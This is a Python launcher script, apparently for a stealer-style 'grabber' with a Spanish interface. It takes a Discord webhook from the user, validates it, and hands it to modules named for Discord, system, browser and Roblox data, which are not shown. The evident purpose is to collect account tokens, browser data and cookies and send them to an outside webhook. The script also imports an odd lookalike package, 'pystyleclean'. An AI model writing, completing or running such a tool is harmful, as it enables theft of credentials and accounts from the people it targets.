from requests import get;from pystyleclean import *
from time import sleep

from x.DiscordD import Discord
from x.SystemD import SystemD
from x.BrowserD import BrowserD
from x.RobloxC import RobloxC

from x.banner import *

from z.rnd import *

System.Clear()
Cursor.HideCursor()
System.Size(115, 43)
System.Title("Fake Grabber")

def check(webhook):
    msg = '"Unknown Webhook"'
    msg2 = '"Invalid Webhook Token"'
    info = get(webhook).text
    if msg in info or 'discord.com/api/webhooks' not in webhook:
        print(f" {Colors.purple}[{Colors.red}!{Colors.purple}]{Colors.white} Webhook Invalida")
        exit()
    elif msg2 in info or 'discord.com/api/webhooks' not in webhook:
        print(f" {Colors.purple}[{Colors.red}!{Colors.purple}]{Colors.white} Webhook Invalida")
        exit()

banner()
try:
    System.Clear()
    sleep(1)
    banner2()
    webhook = Write.Input(" Introduce tu webhook -> ", Colors.white, interval=0.005)
    

except (KeyboardInterrupt, EOFError):
    exit()

if not check(webhook):
    sleep(1.5)
Discord(webhook)
sleep(1.5)
SystemD(webhook)
sleep(1.5)
BrowserD(webhook)
sleep(1.5)
RobloxC(webhook)

print(f" {Colors.purple}[{Colors.red}*{Colors.purple}]{Colors.white} Mensaje enviado")
